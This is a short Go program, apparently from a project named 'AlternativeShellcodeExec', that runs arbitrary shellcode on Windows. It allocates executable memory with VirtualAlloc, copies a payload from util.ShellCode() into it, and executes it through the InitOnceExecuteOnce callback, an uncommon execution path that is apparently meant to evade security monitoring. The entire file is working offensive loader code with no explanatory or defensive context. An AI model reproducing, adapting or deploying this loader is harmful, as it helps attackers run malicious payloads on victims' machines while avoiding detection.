package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	kernel32, _ := syscall.LoadDLL("kernel32.dll")

	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	initOnceExecuteOnce, _ := kernel32.FindProc("InitOnceExecuteOnce")

	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	var lpContext uintptr
	var initOnce uintptr

	initOnceExecuteOnce.Call(uintptr(unsafe.Pointer(&initOnce)), addr, 0, uintptr(unsafe.Pointer(&lpContext)))
}

func main() {
	Run(util.ShellCode())
}
